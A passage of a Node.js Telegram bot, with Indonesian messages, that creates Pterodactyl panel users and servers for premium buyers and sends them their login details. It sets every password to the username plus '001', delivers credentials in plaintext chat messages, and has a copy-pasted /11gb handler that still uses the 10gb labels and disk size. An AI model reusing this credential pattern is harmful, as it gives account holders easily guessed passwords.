        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 6gb
bot.onText(/\/6gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /6gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '6gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '6048';
  const cpu = '170';
  const disk = '6048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 7gb
bot.onText(/\/7gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /7gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '7gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '7048';
  const cpu = '200';
  const disk = '7048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 8gb
bot.onText(/\/8gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /8gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '8gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '8048';
  const cpu = '230';
  const disk = '8048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 9gb
bot.onText(/\/9gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /9gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '9gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '9048';
  const cpu = '260';
  const disk = '9048';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// 10gb
bot.onText(/\/10gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /10gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '10gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '10000';
  const cpu = '290';
  const disk = '10000';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
bot.onText(/\/11gb (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /10gb namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + '10gb';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '11000';
  const cpu = '290';
  const disk = '10000';
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});

// unli
bot.onText(/\/unli (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];
  const premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
  const isPremium = premiumUsers.includes(String(msg.from.id));  
  if (!isPremium) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const t = text.split(',');
  if (t.length < 2) {
    bot.sendMessage(chatId, 'Invalid format. Usage: /unli namapanel,idtele');
    return;
  }
  const username = t[0];
  const u = t[1];
  const name = username + 'unli';
  const egg = settings.eggs;
  const loc = settings.loc;
  const memo = '0';
  const cpu = '0';
  const disk = '0';
  const email = `${username}@buyer.san`;
  const akunlo = settings.pp;
  const spc = 'if [[ -d .git ]] && [[ {{AUTO_UPDATE}} == "1" ]]; then git pull; fi; if [[ ! -z ${NODE_PACKAGES} ]]; then /usr/local/bin/npm install ${NODE_PACKAGES}; fi; if [[ ! -z ${UNNODE_PACKAGES} ]]; then /usr/local/bin/npm uninstall ${UNNODE_PACKAGES}; fi; if [ -f /home/container/package.json ]; then /usr/local/bin/npm install; fi; /usr/local/bin/${CMD_RUN}';
  const password = `${username}001`;
  let user;
  let server;
  try {
    const response = await fetch(`${domain}/api/application/users`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        email: email,
        username: username,
        first_name: username,
        last_name: username,
        language: 'en',
        password: password
      })
    });
    const data = await response.json();
    if (data.errors) {
      if (data.errors[0].meta.rule === 'unique' && data.errors[0].meta.source_field === 'email') {
        bot.sendMessage(chatId, 'Email already exists. Please use a different email.');
      } else {
        bot.sendMessage(chatId, `Error: ${JSON.stringify(data.errors[0], null, 2)}`);
      }
      return;
    }
    user = data.attributes;
    const response2 = await fetch(`${domain}/api/application/servers`, {
      method: 'POST',
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${plta}`
      },
      body: JSON.stringify({
        name: name,
        description: '',
        user: user.id,
        egg: parseInt(egg),
        docker_image: 'ghcr.io/parkervcp/yolks:nodejs_18',
        startup: spc,
        environment: {
          INST: 'npm',
          USER_UPLOAD: '0',
          AUTO_UPDATE: '0',
          CMD_RUN: 'npm start'
        },
        limits: {
          memory: memo,
          swap: 0,
          disk: disk,
          io: 500,
          cpu: cpu
        },
        feature_limits: {
          databases: 5,
          backups: 5,
          allocations: 1
        },
        deploy: {
          locations: [parseInt(loc)],
          dedicated_ip: false,
          port_range: []
        }
      })
    });
    const data2 = await response2.json();
    server = data2.attributes;
  } catch (error) {
    bot.sendMessage(chatId, `Error: ${error.message}`);
  }
  if (user && server) {
    bot.sendMessage(chatId, `BERIKUT DATA PANEL ANDA
NAMA: ${username}
EMAIL: ${email}
ID: ${user.id}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%`);
    if (akunlo) {
      bot.sendPhoto(u, akunlo, {
        caption: `Hai @${u}

HERE'S YOUR PANEL DATA ⤵️
🚩 Login : ${domain}
🚩 Username : ${user.username}
🚩 Password : ${password} 
==============================
Jangan Lupa Bilang Done Jika Sudah Di Cek

#CARA UP SC DI PANEL
https://youtu.be/DzbJZyTj5KY?si=HUS_nCXLiopRyjiW
==============================
CREATE PANEL BY hitsssh😁✌️`
        });
      bot.sendMessage(chatId, 'Data panel berhasil dikirim ke ID Telegram yang dimaksud.');
    }
  } else {
    bot.sendMessage(chatId, 'Gagal membuat data panel. Silakan coba lagi.');
  }
});
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
// createadmin
bot.onText(/\/createadmin (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const adminUsers = JSON.parse(fs.readFileSync(adminfile));
  const isAdmin = adminUsers.includes(String(msg.from.id));  
  if (!isAdmin) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Owner, Hubungi Admin Saya Untuk Menjadi Owner atau Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/hitsssh' }
          ]
        ]
      }
    });
    return;
  }
  const commandParams = match[1].split(',');
  const panelName = commandParams[0].trim();
